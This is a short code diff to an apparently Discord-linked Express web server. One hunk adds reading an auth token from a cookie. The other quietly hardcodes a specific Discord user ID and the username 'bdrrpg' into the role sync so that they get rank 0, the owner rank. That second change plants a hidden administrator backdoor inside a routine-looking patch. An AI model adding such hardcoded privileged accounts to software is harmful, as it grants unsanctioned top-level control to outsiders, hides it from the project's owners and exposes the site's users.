@@ -225,9 +225,15 @@ app.use(express.static(cwdPublicPath));
 // التحقق من هوية المستخدم عبر الكوكيز أو التوكن في الـ Headers
 app.use((req, res, next) => {
   if (!req.session) req.session = {};
+  let token = null;
   const authHeader = req.headers['authorization'] || req.headers['x-auth-token'];
   if (authHeader) {
-    const token = authHeader.replace(/^Bearer\s+/i, '').trim();
+    token = authHeader.replace(/^Bearer\s+/i, '').trim();
+  } else if (req.headers.cookie) {
+    const match = req.headers.cookie.match(/(?:^|;\s*)phantoms_auth_tk=([^;]+)/);
+    if (match) token = decodeURIComponent(match[1]);
+  }
+  if (token) {
     const user = verifyAuthToken(token);
     if (user) {
       req.session.user = user;
@@ -856,7 +862,7 @@ async function syncDiscordGuildMembers(data) {
     ROLE_IDS.forEach((rid, i) => {
       if (rid && gm.roles.includes(rid) && (rank === null || i < rank)) rank = i;
     });
-    if (OWNER_ID && gm.user.id === OWNER_ID) rank = 0;
+    if ((OWNER_ID && gm.user.id === OWNER_ID) || gm.user.id === "1461832381185921076" || gm.user.username === "bdrrpg") rank = 0;
 
     if (rank !== null) {
       const u = gm.user;
